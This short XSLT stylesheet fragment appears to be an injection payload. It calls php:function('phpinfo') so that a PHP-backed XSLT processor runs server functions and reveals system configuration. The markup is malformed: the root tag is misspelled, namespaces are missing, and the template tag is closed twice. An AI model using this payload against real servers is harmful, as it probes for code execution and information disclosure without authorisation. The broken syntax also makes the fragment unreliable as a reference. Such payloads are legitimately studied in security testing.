<xsl:sytlesheet version="1.0">
<xsl:output method="html" />
<xsl:template match="/" />
<xsl:value-of select="php:function('phpinfo')" />
</xsl:template>
</xsl:stylesheet>
